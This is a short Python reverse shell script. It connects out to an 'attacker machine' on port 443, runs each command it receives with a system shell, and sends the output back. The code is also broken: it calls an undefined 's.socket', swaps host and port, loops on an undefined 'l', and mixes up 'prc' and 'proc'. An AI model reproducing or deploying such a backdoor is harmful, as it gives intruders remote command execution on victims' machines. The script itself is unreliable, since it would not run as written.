#!/usr/bin/python3

import socket, subprocess
HOST = '' # the remote host
PORT = 443 # same port as used by the server
s = s.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect to attacker machine
s.connect((PORT, HOST))
# send message to confirm connection
s.send('[*] Connection Established ...')
# start loop
while l:
  # receive shell command
  data = s.recv(1024)
  # if it'S quiet, then break out and close socket
  if data == "quiet": break
  # do shell command
  prc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,
  stderr=subprocess.PIPE, stdin=subprocess.PIPE)
  # read output
  stdout_value = proc.stdout.read() + proc.stderr.read()
  # send output to attacker
  s.send(stdout_value)
# close socket
s.close()
